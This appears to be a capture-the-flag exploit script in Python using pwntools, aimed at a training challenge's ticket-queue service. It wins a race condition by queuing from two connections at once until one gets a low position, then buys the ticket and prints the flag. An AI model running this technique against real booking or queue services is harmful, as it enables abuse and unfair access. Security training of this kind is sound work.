from pwn import *

# This revolutionary online ticket store asks you if you want to queue or to buy a ticket and your name.
# Some strange magic happens when you choose an option: the program opens the queue db and copies it to another file and then works on that file. This copy process allows us to race for the ticket.
# Flag file is necessary because otherwise the program segfaults when trying to open it.

def get_token(c) :
    c.recvuntil(b"token: ")
    return c.recvline().strip()

def queue(c, name):
    c.recvuntil(b'> ')
    c.sendline(b'queue ' + name)

def buy(c, name):
    c.recvuntil(b'> ')
    c.sendline(b'buy ' + name)

def get_pos(res):
    print(res)      # debug

    if ': ' not in res:
        return -1
    
    return int(res.split(': ')[1])

if args.REMOTE:
    c_token = remote('ticket-none.training.offensivedefensive.it', 8080, ssl = True)
    token = get_token(c_token)
    c_token.close()
    print(token)
    host = 'private.training.offensivedefensive.it'
    port = 8080
    ssl = True
else:
    serv = process('./start.sh')
    serv.recvline()
    host = '0.0.0.0'
    port = 4000
    ssl = False

c1 = remote(host, port, ssl=ssl)
c2 = remote(host, port, ssl=ssl)

if args.REMOTE:
    c1.recvuntil(b"Token: ")
    c1.sendline(token)
    c2.recvuntil(b"Token: ")
    c2.sendline(token)

for i in range(10000):
    # Changing name because outherwise it would always say "You're already in line"
    name = b'name' + str(i).encode('utf-8')

    # Queuing with both so the first one copies the file, while the other overwrites it
    queue(c1, name)
    queue(c2, name)

    # Getting the two responses to see if we gained a good position
    r1 = c1.recvline(keepends=False).decode('utf-8')
    r2 = c2.recvline(keepends=False).decode('utf-8')

    print('c1: ', end='')       # debug
    n1 = get_pos(r1)
    print('c2: ', end='')       # debug
    n2 = get_pos(r2)

    # If one of the two threads won the race, its position is between 1 and 50000, so we can buy the ticket
    if n1 > 0 and n1 <= 50000 or n2 > 0 and n2 <= 50000:
        buy(c1, name)
        res = c1.recvline(keepends=False).decode('utf-8')

        if 'ticket!' in res:
            c1.recvline(keepends=False)
            print(c1.recvline(keepends=False).decode('utf-8'))
            break
